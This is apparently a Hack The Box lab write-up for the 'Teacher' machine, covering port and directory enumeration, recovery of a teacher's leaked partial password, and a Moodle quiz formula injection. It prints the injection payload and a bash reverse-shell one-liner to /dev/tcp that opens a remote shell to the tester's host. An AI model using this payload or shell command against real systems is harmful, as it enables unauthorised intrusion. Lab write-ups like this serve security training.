# HTB - Teacher
## OS - Linux

Teacher's IP address is 10.10.10.153. Started with an nmap scan.
```
$nmap -sC -sV -oN nmap 10.10.10.153
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-06 07:59 PDT
Nmap scan report for 10.10.10.153
Host is up (0.088s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.11 seconds
```


Only port 80 is open.
The web interface shows a web page for school. There's an announcement that the web portal was new, that the students can submit their work. Only gallery.html seems to be working.

In the gallery page, the teacher photos are seen. One of the photos is not visible, the rest are not rendered properly. If we view the source of the page, we see that the photo that is not rendered is http://10.10.10.153/images/5.png.

When we curl that image, we see a note.
```
$curl http://10.10.10.153/images/5.png
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni

```

Ran dirbuster but it stopped after a few errors. Gobuster worked fine.

```
$gobuster dir -t 40 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.153
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.153
[+] Threads:        40
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/09/06 12:05:28 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/moodle (Status: 301)

```
/moodle shows the Teachers page, and lists Algebra course with teacher Giovanni Chhatta.

Giovanni's link - http://10.10.10.153/moodle/user/view.php?id=3&course=1
Algebra course link - http://10.10.10.153/moodle/course/view.php?id=2

We try to login as giovanni using part of the password given above, and then enumerate using intruder to find the full password.

giovanni's password is Th4C00lTheacha#.

Exploring the site as giovanni shows a message to admin:
```
Hey admin.

How am I supposed to create a quiz? I'm kinda in a hurry since I need this for tomorrow.

Kind regards,
Giovanni
```

Took a while to repro this part, but finally, the formula worked for /*{a*/`$_REQUEST[rad]`;//{x}}

and then in the URL:
http://10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D7%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=6&wizardnow=datasetitems&cmid=7

added the parameter:
&rad=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.4/6000+0>%261'

Got a nc shell.

